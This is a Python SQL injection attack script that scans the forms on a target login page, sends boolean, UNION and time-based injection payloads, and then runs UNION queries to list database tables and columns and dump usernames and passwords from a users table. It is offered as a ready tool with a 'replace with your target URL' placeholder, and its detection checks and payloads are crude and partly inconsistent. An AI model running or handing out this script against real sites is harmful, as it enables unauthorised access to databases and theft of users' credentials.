import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Set up the target URL
url = "http://example.com/login.php"  # Replace with your target URL
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# SQL Injection payloads
payloads = [
    "' OR 1=1 --",  # Basic SQLi payload
    "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
    "' WAITFOR DELAY '0:0:5' --",  # Time-based Blind SQLi
]

# Data dump payloads
data_dump_payloads = [
    "' UNION SELECT NULL, NULL, database() --",  # Get database name
    "' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'your_db_name' --",  # Get table names
    "' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Get columns of users table
    "' UNION SELECT username, password FROM users --",  # Dump usernames and passwords
]

# Function to detect SQLi vulnerabilities
def detect_sqli(url, payload, headers):
    try:
        # Send GET request with SQLi payload in URL parameters
        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"})
        
        # Check if the response contains signs of SQLi (error messages, or abnormal outputs)
        if "error" in response.text.lower() or "username" in response.text.lower():
            print(f"SQLi vulnerability detected with payload: {payload}")
            return True
        return False
    except requests.RequestException as e:
        print(f"Error sending request: {e}")
        return False

# Function to dump data from a vulnerable page
def dump_data(url, payloads, headers):
    for payload in payloads:
        print(f"Trying payload for data dump: {payload}")
        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"})
        
        # If the response contains data (e.g., usernames or table names), print it
        if "username" in response.text.lower() or "password" in response.text.lower():
            print("Data dump result:")
            print(response.text[:500])  # Print the first 500 characters of the response for review

# Function to scan forms and detect SQLi vulnerabilities
def scan_forms_and_dump(url, headers, payloads, data_dump_payloads):
    # First, get the page content
    response = requests.get(url, headers=headers)
    
    if response.status_code != 200:
        print(f"Failed to retrieve the page. Status code: {response.status_code}")
        return

    # Parse the page with BeautifulSoup
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Find all forms on the page (you can expand this to handle other types of form inputs)
    forms = soup.find_all("form")
    
    forms_detected = 0
    successful_payloads = []
    
    # Loop over each form and test for SQLi vulnerabilities
    for form in forms:
        action_url = form.get("action")
        if not action_url:
            continue
        
        # Combine relative URL with the base URL
        action_url = urljoin(url, action_url)

        print(f"Testing form at {action_url}")

        for payload in payloads:
            # Test each form with the SQLi payload
            if detect_sqli(action_url, payload, headers):
                forms_detected += 1
                successful_payloads.append(payload)
    
    print(f"\nDetected {forms_detected} vulnerable form(s) with SQLi.")
    
    if forms_detected > 0:
        print("\nDumping data...")
        dump_data(url, data_dump_payloads, headers)
    else:
        print("No SQLi vulnerabilities detected. No data dump performed.")

# Run the full scan
scan_forms_and_dump(url, headers, payloads, data_dump_payloads)
